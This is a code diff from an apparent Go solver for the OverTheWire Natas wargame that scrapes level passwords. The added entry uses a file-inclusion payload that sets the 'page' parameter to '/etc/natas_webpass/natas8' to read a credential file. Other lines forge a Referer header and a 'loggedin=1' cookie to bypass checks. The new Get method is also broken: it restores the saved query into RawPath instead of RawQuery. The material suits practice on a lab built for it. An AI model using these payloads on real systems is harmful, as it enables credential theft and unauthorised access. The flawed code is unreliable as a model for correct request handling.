@@ -99,6 +99,19 @@ func (s SetPost) Grab(r http.Request) (string, error) {
 	return s.Post.Grab(r)
 }
 
+type Get struct {
+	Grabber
+	Data url.Values
+}
+
+func (g Get) Grab(r http.Request) (string, error) {
+	oldQuery := r.URL.RawQuery
+	r.URL.RawQuery = g.Data.Encode()
+	s, err := g.Grabber.Grab(r)
+	r.URL.RawPath = oldQuery
+	return s, err
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
@@ -107,6 +120,7 @@ var levels = [...]Grabber{
 	Headers{Prefixed{"The password for natas5 is ", 32}, http.Header{"Referer": []string{"http://natas5.natas.labs.overthewire.org/"}}},
 	Headers{Prefixed{"The password for natas6 is ", 32}, http.Header{"Cookie": []string{"loggedin=1"}}},
 	SetPost{Post{Prefixed{"The password for natas7 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}, "secret"},
+	Get{Prefixed{"<br>\n<br>\n", 32}, url.Values{"page": []string{"/etc/natas_webpass/natas8"}}},
 }
 
 func main() {
